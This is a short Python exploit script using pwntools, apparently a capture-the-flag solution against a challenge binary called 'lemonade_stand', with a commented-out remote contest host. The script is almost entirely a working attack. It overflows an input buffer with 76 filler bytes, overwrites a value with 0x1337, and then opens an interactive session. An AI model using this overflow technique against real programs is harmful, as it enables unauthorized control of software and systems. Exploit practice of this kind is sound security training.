from pwn import *

context.binary=elf=ELF("./lemonade_stand")
#p=remote("offsec.m0lecon.it",13541)
p=process(elf.path)
offset=64+12

ret=ROP(elf).find_gadget(['ret'])[0]


target=0x1337
p.recvuntil(b"price:")

payload=flat(
    b'b'*offset,
    p32(target)

)
#gdb.attach(p)
p.sendline(payload)
print(p.recv())
p.interactive()
